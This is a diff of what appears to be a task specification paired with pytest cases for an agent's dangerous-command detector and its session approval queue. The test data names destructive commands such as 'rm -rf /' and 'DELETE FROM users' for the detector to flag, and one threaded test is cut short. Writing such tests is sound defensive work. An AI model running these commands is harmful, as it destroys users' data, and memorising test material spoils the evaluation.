-**Mode normalization:** The function `_normalize_approval_mode(mode)` normalizes mode values. When the config contains `{"approvals": {"mode": False}}` (YAML unquoted boolean `false`), `_get_approval_mode()` returns the string `"off"`. When the config contains `{"approvals": {"mode": "off"}}` (string), `_get_approval_mode()` returns `"off"`.
+```python
+    def test_delete_without_where(self):
+        is_dangerous, _, desc = detect_dangerous_command("DELETE FROM users")
+        assert is_dangerous is True
+        assert "delete" in desc.lower()
+```
 
-### Node 4: Session-Scoped Approvals
+### Note 12: test_delete_with_where_safe
+Tests symbols: `detect_dangerous_command`
 
-`approve_session(session_key: str, pattern_key: str)` approves a pattern for a specific session. Thread-safe access to `_session_approvals` must be protected by acquiring the module-level lock.
+```python
+    def test_delete_with_where_safe(self):
+        is_dangerous, key, desc = detect_dangerous_command("DELETE FROM users WHERE id = 1")
+        assert is_dangerous is False
+        assert key is None
+        assert desc is None
+```
 
-`is_approved(session_key: str, pattern_key: str)` checks if a pattern is approved for a session. It returns `True` if the pattern has been approved for that session via `approve_session()`, or if the pattern is in the permanent allowlist. It returns `False` otherwise. Thread-safe access to `_session_approvals` and `_permanent_approved` must be protected by acquiring the module-level lock.
+### Note 13: test_echo_is_safe
+Tests symbols: `detect_dangerous_command`
 
-`clear_session(session_key: str)` clears all approvals and pending requests for a session. After calling `clear_session(key)`, `is_approved(key, "rm")` returns `False` even if `approve_session(key, "rm")` was previously called. Thread-safe access to `_session_approvals` and `_session_pending` must be protected by acquiring the module-level lock.
+```python
+    def test_echo_is_safe(self):
+        is_dangerous, key, desc = detect_dangerous_command("echo hello world")
+        assert is_dangerous is False
+        assert key is None
+```
 
-### Node 5: Pending Approval Storage
+### Note 14: test_ls_is_safe
+Tests symbols: `detect_dangerous_command`
 
-`submit_pending(session_key: str, approval: dict)` stores a pending approval request for a session. The `approval` dict contains at least the keys `"command"` and `"pattern_key"`. Multiple pending approvals may be queued for the same session. Thread-safe access to `_session_pending` must be protected by acquiring the module-level lock.
+```python
+    def test_ls_is_safe(self):
+        is_dangerous, key, desc = detect_dangerous_command("ls -la /tmp")
+        assert is_dangerous is False
+        assert key is None
+        assert desc is None
+```
 
-`pop_pending(session_key: str)` retrieves and removes the first (oldest) pending approval for a session in FIFO order. It returns the approval dict if one exists, or `None` if no pending approval exists. Thread-safe access to `_session_pending` must be protected by acquiring the module-level lock.
+### Note 15: test_git_is_safe
+Tests symbols: `detect_dangerous_command`
 
-`has_pending(session_key: str)` checks if a session has a pending approval request. It returns `True` if `submit_pending()` was called and `pop_pending()` has not yet been called, and `False` otherwise. Thread-safe access to `_session_pending` must be protected by acquiring the module-level lock.
+```python
+    def test_git_is_safe(self):
+        is_dangerous, key, desc = detect_dangerous_command("git status")
+        assert is_dangerous is False
+        assert key is None
+        assert desc is None
+```
 
-After `pop_pending(key)` is called, `has_pending(key)` returns `False`.
+### Note 16: test_submit_and_pop
+Tests symbols: `clear_session`, `has_pending`, `pop_pending`, `submit_pending`
 
-### Node 6: Context-Local Session Key Management
+```python
+    def test_submit_and_pop(self):
+        key = "test_session_pending"
+        clear_session(key)
 
-`set_current_session_key(session_key: str)` binds the active approval session key to the current context and returns a `contextvars.Token[str]`.
+        submit_pending(key, {"command": "rm -rf /", "pattern_key": "rm"})
+        assert has_pending(key) is True
 
-`reset_current_session_key(token: contextvars.Token[str])` restores the prior approval session key context using the token returned by `set_current_session_key()`.
+        approval = pop_pending(key)
+        assert approval["command"] == "rm -rf /"
+        assert has_pending(key) is False
+```
 
-`get_current_session_key(default: str = "default")` returns the active session key, preferring context-local state over environment variables. When `set_current_session_key("alice")` has been called in the current context, `get_current_session_key()` returns `"alice"` even if `os.environ["HERMES_SESSION_KEY"]` is set to `"bob"`. The context-local binding takes precedence.
+### Note 17: test_pop_empty_returns_none
+Tests symbols: `clear_session`, `has_pending`, `pop_pending`
 
-**Gateway integration:** The gateway's `run.py` module contains a `run_sync()` function that calls both `set_current_session_key()` and `reset_current_session_key()` to bind the session key to the context before running the agent.
+```python
+    def test_pop_empty_returns_none(self):
+        key = "test_session_empty"
+        clear_session(key)
+        assert pop_pending(key) is None
+        assert has_pending(key) is False
+```
 
-**Thread isolation:** Each thread has its own context. When thread A calls `set_current_session_key("alice")` and thread B calls `set_current_session_key("bob")`, pending approvals submitted in thread A are stored under session key `"alice"` and pending approvals submitted in thread B are stored under session key `"bob"`. After both threads complete, `pop_pending("alice")` returns a non-None value and `pop_pending("bob")` returns `None` (or vice versa depending on which thread submitted a pending approval).
+### Note 18: test_session_approval
+Tests symbols: `approve_session`, `clear_session`, `is_approved`
 
-### Node 7: Command Guard Checking
+```python
+    def test_session_approval(self):
+        key = "test_session_approve"
+        clear_session(key)
 
-`check_all_command_guards(command: str, env_type: str, approval_callback = None)` runs all pre-exec security checks and returns a single approval decision dict.
+        assert is_approved(key, "rm") is False
+        approve_session(key, "rm")
+        assert is_approved(key, "rm") is True
+```
 
-When `HERMES_EXEC_ASK` environment variable is set to `"1"`, this function calls `detect_dangerous_command()` and, if the command is dangerous, calls `submit_pending()` to store a pending approval request for the current session (obtained via `get_current_session_key()`). The session key is obtained from the context-local binding set by `set_current_session_key()`, not from the environment variable, ensuring that pending approvals are attached to the originating session even when multiple sessions are active in different threads.
+### Note 19: test_clear_session_removes_approvals
+Tests symbols: `approve_session`, `clear_session`, `has_pending`, `is_approved`
 
-### Node 8: prompt_dangerous_approval Return Values and Invalid Input Handling
+```python
+    def test_clear_session_removes_approvals(self):
+        key = "test_session_clear"
+        approve_session(key, "rm")
+        assert is_approved(key, "rm") is True
+        clear_session(key)
+        assert is_approved(key, "rm") is False
+        assert has_pending(key) is False
+```
 
-`prompt_dangerous_approval()` must return one of four string values:
-- `"once"`: approve this command execution only (do not cache approval)
-- `"session"`: approve this command for the current session (cache in `_session_approvals`)
-- `"always"`: approve this command permanently (add to permanent allowlist via `approve_permanent`)
-- `"deny"`: reject the command (do not execute)
+### Note 20: test_context_session_key_overrides_process_env
+Tests symbols: `get_current_session_key`, `reset_current_session_key`, `set_current_session_key`
 
-When `allow_permanent` is `False`, the `"always"` option should not be offered to the user.
+```python
+    def test_context_session_key_overrides_process_env(self):
+        token = approval_module.set_current_session_key("alice")
+        try:
+            with mock_patch.dict("os.environ", {"HERMES_SESSION_KEY": "bob"}, clear=False):
+                assert approval_module.get_current_session_key() == "alice"
+        finally:
+            approval_module.reset_current_session_key(token)
+```
 
-**Invalid input handling:** When the user enters an invalid choice (not matching any valid option), the function must return `"deny"` as the default fallback. For example, if the user enters `'v'` (which is no longer a valid option), the function returns `"deny"`.
+### Note 21: test_gateway_runner_binds_session_key_to_context_before_agent_run
+
+```python
+    def test_gateway_runner_binds_session_key_to_context_before_agent_run(self):
+        run_py = Path(__file__).resolve().parents[2] / "gateway" / "run.py"
+        module = ast.parse(run_py.read_text(encoding="utf-8"))
+
+        run_sync = None
+        for node in ast.walk(module):
+            if isinstance(node, ast.FunctionDef) and node.name == "run_sync":
+                run_sync = node
+                break
+
+        assert run_sync is not None, "gateway.run.run_sync not found"
+
+        called_names = set()
+        for node in ast.walk(run_sync):
+            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
+                called_names.add(node.func.id)
+
+        assert "set_current_session_key" in called_names
+        assert "reset_current_session_key" in called_names
+```
+
+### Note 22: test_context_keeps_pending_approval_attached_to_originating_session
+Tests symbols: `check_all_command_guards`, `clear_session`, `pop_pending`, `reset_current_session_key`, `set_current_session_key`
+
+```python
+    def test_context_keeps_pending_approval_attached_to_originating_session(self):
+        import os
+        import threading
+
+        clear_session("alice")
+        clear_session("bob")
+        pop_pending("alice")
+        pop_pending("bob")
+        approval_module._permanent_approved.clear()
+
+        alice_ready = threading.Event()
+        bob_ready = threading.Event()
+
+        def worker_alice():
+            token = approval_module.set_current_session_key("alice")
+            try:
+                os.environ["HERMES_EXEC_ASK"] = "1"
+                os.environ["HERMES_SESSION_KEY"] = "alice"
+                alice_ready.set()
+                bob_ready.wait()
+```
+
+### Note 23: test_rm_readme_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_readme_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm readme.txt")
+        assert is_dangerous is False, f"'rm readme.txt' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 24: test_rm_requirements_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_requirements_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm requirements.txt")
+        assert is_dangerous is False, f"'rm requirements.txt' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 25: test_rm_report_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_report_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm report.csv")
+        assert is_dangerous is False, f"'rm report.csv' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 26: test_rm_results_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_results_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm results.json")
+        assert is_dangerous is False, f"'rm results.json' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 27: test_rm_robots_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_robots_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm robots.txt")
+        assert is_dangerous is False, f"'rm robots.txt' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 28: test_rm_run_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_run_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm run.sh")
+        assert is_dangerous is False, f"'rm run.sh' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 29: test_rm_force_readme_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_force_readme_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm -f readme.txt")
+        assert is_dangerous is False, f"'rm -f readme.txt' should be safe, got: {desc}"
+        assert key is None
+```
+
+### Note 30: test_rm_verbose_readme_not_flagged
+Tests symbols: `detect_dangerous_command`
+
+```python
+    def test_rm_verbose_readme_not_flagged(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm -v readme.txt")
+        assert is_dangerous is False, f"'rm -v readme.txt' should be safe, got: {desc}"
+        assert key is None
+```
